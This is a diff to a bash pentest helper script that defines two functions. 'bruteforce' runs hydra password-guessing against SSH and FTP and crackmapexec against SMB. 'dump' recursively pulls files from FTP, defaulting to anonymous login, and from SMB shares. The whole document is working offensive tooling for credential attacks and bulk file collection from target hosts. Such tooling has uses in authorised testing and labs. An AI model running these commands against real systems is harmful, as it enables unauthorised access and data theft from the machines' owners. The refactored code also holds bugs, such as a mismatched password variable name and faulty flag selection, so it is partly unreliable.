@@ -1,15 +1,23 @@
 #!/bin/bash
 
 
-# Description: bruteforce services
-# Usage: bruteforce <-i, --ip IP> <-s, --service ftp|ssh> [-u, --username string|file] [-p, --password string|file] [-P, --port port]
+# Description:
+#   Bruteforce services with predefined arguments.
+#   By default, it loads the username.txt and password.txt on the current directory.
+# Usage: bruteforce [-h, --help] <-i, --ip IP> <-s, --service SERVICE> [OPTIONS]
+# Arguments:
+#   - IP: target IPv4 address
+#   - SERVICE: current support with: ssh, ftp, smb
+#   - OPTIONS:
+#       + [-u, --username string|file]: used username (or wordlist)
+#       + [-p, --password string|file]: used password (or wordlist)
+#       + [-P, --port port]: used port
 # Example: 
-#   ```sh
-#   bruteforce -i 192.168.1.1 ssh    
-#   ```
+#   bruteforce -s ssh -i $target
+#   bruteforce -s smb -i $target
+#   bruteforce -s ftp -i $target -p password.txt
 function bruteforce() {
-    _disable_auto_exploit_function
-    [[ $? -eq 1 ]] && return 1
+    [[ $# -eq 0 || $1 == "-h" || $1 == "--help" ]] && _help && return 0
 
     local IP
     local service
@@ -17,189 +25,97 @@ function bruteforce() {
     local used_username="$PWD/username.txt"
     local used_password="$PWD/password.txt"
 
-    _helper() {
-        swiss_logger info "[i] Usage: hydra_default <-i, --ip IP> <-s, --service ftp|ssh> [-u, --username string|file] [-p, --password string|file] [-P, --port port]"
-    }
-
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            -i|--ip)
-                IP="$2"
-                shift 2
-                ;;
-            -s|--service)
-                service="$2"
-                shift 2
-                ;;
-            -P|--port)
-                port="$2"
-                shift 2
-                ;;
-            -u|--username)
-                used_username="$2"
-                shift 2
-                ;;
-            -p|--password)
-                used_password="$2"
-                shift 2
-                ;;
-            *)
-                _helper
-                return 0
-                ;;
+            -i|--ip) IP="$2" && shift 2 ;;
+            -s|--service) service="$2" && shift 2 ;;
+            -P|--port) port="$2" && shift 2 ;;
+            -u|--username) used_username="$2" && shift 2 ;;
+            -p|--password) used_password="$2" && shift 2 ;;
+            *) _help && return 0 ;;
         esac
     done
 
-    swiss_logger debug "[d] service: $service"
-
-    if [[ ! -f "$used_username" && ! -n "$used_username" ]]; then
-        swiss_logger error "[e] type of username incorrect. Required: string, files"
-    fi
-
-    if [[ ! -f "$used_password" && ! -n "$used_password" ]]; then
-        swiss_logger error "[e] type of password incorrect. Required: string, files"
-    fi
+    [[ ! -f "$used_username" && ! -n "$used_username" ]] && swiss_logger error "[e] type of username incorrect. Required: string, files" && return 1
+    [[ ! -f "$used_password" && ! -n "$used_password" ]] && swiss_logger error "[e] type of password incorrect. Required: string, files" && return 1
 
     case $service in
-        ftp)
-            local used_port="${port:-21}"
-
-            swiss_logger info "[i] Running hydra_default for FTP"
-            swiss_logger info "[i] Run -e nsr with $used_username"
-
-            if [ -f "$used_username" ]; then
-                hydra -L $used_username -e nsr -s $used_port ftp://$IP
-            elif [ -n "$used_username" ]; then
-                hydra -l $used_username -e nsr -s $used_port ftp://$IP
+        ftp|ssh)
+            if [[ "$service" == "ftp" ]]; then
+                used_port="${port:-21}"
+            elif [[ "$service" == "ssh" ]]; then
+                used_port="${port:-22}"
             fi
 
+            local username_fmt
+            [[ -z "$used_username" ]] && swiss_logger error "[e] username is not set." && return 1
+            [[ -n "$used_username" ]] && username_fmt="-l" || [[ -f "$used_username" ]] && username_fmt="-L"
+            
+            local password_fmt
+            [[ -z "$used_password" ]] && swiss_logger error "[e] username is not set." && return 1
+            [[ -n "$used_password" ]] && password_fmt="-p" || [[ -f "$used_password" ]] && password_fmt="-P"
+
+            swiss_logger info "[i] bruteforce $service. Run -e nsr with $used_username"
+            _wrap "hydra $username_fmt $used_username -e nsr -s $used_port $service://$IP"
+            
             swiss_logger info "[i] Run $used_username with $used_password"
-            if [ -f "$used_username" ]; then   
-                if [ -f "$used_password" ]; then
-                    hydra -L $used_username -P $used_password -s $used_port ftp://$IP
-                else
-                    hydra -L $used_username -p $used_password -s $used_port ftp://$IP
-                fi
-            elif [ -n "$used_username" ]; then
-                if [ -f "$used_password" ]; then
-                    hydra -l $used_username -P $used_password -s $used_port ftp://$IP
-                else
-                    hydra -l $used_username -p $used_password -s $used_port ftp://$IP
-                fi
-            fi
-            ;;
-        ssh)
-            local used_port="${port:-22}"
-
-            swiss_logger info "[i] Running hydra_default for SSH"
-            swiss_logger info "[i] Run -e nsr with $used_username"
-
-            if [ -f "$used_username" ]; then
-                hydra -L $used_username -e nsr -s $used_port ssh://$IP
-            elif [ -n "$used_username" ]; then
-                hydra -l $used_username -e nsr -s $used_port ssh://$IP
-            fi
-
-            swiss_logger info "[i] Run $used_username with $used_password"
-            if [ -f "$used_username" ]; then
-                if [ -f "$used_password" ]; then
-                    hydra -L $used_username -P $used_password -s $used_port ssh://$IP
-                else
-                    hydra -L $used_username -p $used_password -s $used_port ssh://$IP
-                fi
-            elif [ -n "$used_username" ]; then
-                if [ -f "$used_password" ]; then
-                    hydra -l $used_username -P $used_password -s $used_port ssh://$IP
-                else
-                    hydra -l $used_username -p $used_password -s $used_port ssh://$IP
-                fi
-            fi
+            _wrap "hydra $username_fmt $used_username $password_fmt $used_password -s $used_port $service://$IP"
             ;;
         smb)
             _wrap "crackmapexec smb $IP -u $used_username -p $used_password"
-            ;;
-        *)
-            swiss_logger error "[e] Port $PORT not recognized or not supported for brute-forcing by this script."
             ;;
     esac
 }
 
 # Description: dump files from FTP or SMB service
-# Usage: dump <service name> <ip> [service options]
+# Usage: dump <-s, --service SERVICE> <-i, --ip IP> [OPTIONS]
 # Arguments:
-#   - service name: ftp, smb
-#   - ip: IP address of the target machine
+#   - SERVICE: ftp, smb
+#   - IP: IP address of the target machine
+#   - OPTIONS:
+#       + [-u, --username USERNAME]: used username. (ftp default = 'anonymous', smb default = '')
+#       + [-p, --password PASSWORD]: used password. (ftp default = 'anonymous', smb default = '')
+#       + [-s, --share SHARES]: (SMB) shares used.
 # Example:
-#   dump ftp $target_ip -u username -p password
-#   dump smb $target_ip -s share
-# TODO: optimize the logic using flags
-function dump() { 
-    _help() {
-        swiss_logger info "Usage: dump <service name> <ip> [service options]"
-        swiss_logger info "* ftp"
-        swiss_logger info "\t[optional] -u, --username (default: anonymous)"
-        swiss_logger info "\t[optional] -p, --password (default: anonymous)"
-        swiss_logger info "* smb"
-        swiss_logger info "\t[required] -s, --share"
-    }
+#   dump -s ftp -i $target
+#   dump -s smb -i $target --share share -u dexter -p dexter
+function dump() {
+    [[ $# -eq 0 || $1 == "-h" || $1 == "--help" ]] && _help && return 0
 
-    local service="$1"
-    local ip="$2"
-    shift 2;
-    if [[ -z "$service" ]] || [[ -z "$ip" ]]; then
-        _help
-        return 1
-    fi
+    local IP
+    local service
+    local port
+    local options_username
+    local option_password
+    local options_share
+
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            -i|--ip) IP="$2" && shift 2 ;;
+            -s|--service) service="$2" && shift 2 ;;
+            -P|--port) port="$2" && shift 2 ;;
+            -u|--username) options_username="$2" && shift 2 ;;
+            -p|--password) options_password="$2" && shift 2 ;;
+            -S|--share) options_share="$2" && shift 2 ;;
+            *) _help && return 0 ;;
+        esac
+    done
 
     case "$service" in
         ftp)
-            swiss_logger info "[i] dump from FTP"
-            local username="anonymous"
-            local password="anonymous"
-            while [[ $# -gt 0 ]]; do
-                case $1 in
-                    -u|--username)
-                        username="$2"
-                        shift 2
-                        ;;
-                    -p|--password)
-                        password="$2"
-                        shift 2
-                        ;;
-                    *)
-                        shift 1
-                        ;;
-                esac
-            done
-            wget -r --no-passive --no-parent ftp://$username:$password@$ip
+            swiss_logger info "[i] Dumping files from FTP server"
+            local username="${options_username:-anonymous}"
+            local password="${options_password:-anonymous}"
+            _wrap "wget -r --no-passive --no-parent ftp://$username:$password@$IP"
             ;;
         smb)
             swiss_logger info "[i] dump from SMB"
-            local username=""
-            local password=""
-            local share=""
-            while [[ $# -gt 0 ]]; do
-                case $1 in
-                    -s|--share)
-                        share="$2"
-                        shift 2
-                        ;;
-                    *)
-                        shift 1
-                        ;;
-                esac
-            done
-
-            if [[ -z "$share" ]]; then
-                _help
-                return 1
-            fi
-
-            smbclient //$ip/$share -N -c 'prompt OFF;recurse ON;cd; lcd '$PWD';mget *'
+            # TODO: impl username and password access
+            local username="${options_username:-}"
+            local password="${options_password:-}"
+            [[ -z "$options_share" ]] && swiss_logger error "[e] Shares must be specified. Use -S, --share." && return 1
+            smbclient //$IP/$options_share -N -c 'prompt OFF;recurse ON;cd; lcd '$PWD';mget *'
             ;;
-        *)
-            swiss_logger error "[e] Invalid service '$service'. Valid service: ftp, smb"
-            return 1
-            ;;
+        *) swiss_logger error "[e] Invalid service '$service'. Valid service: ftp, smb" && return 1 ;;
     esac
 }
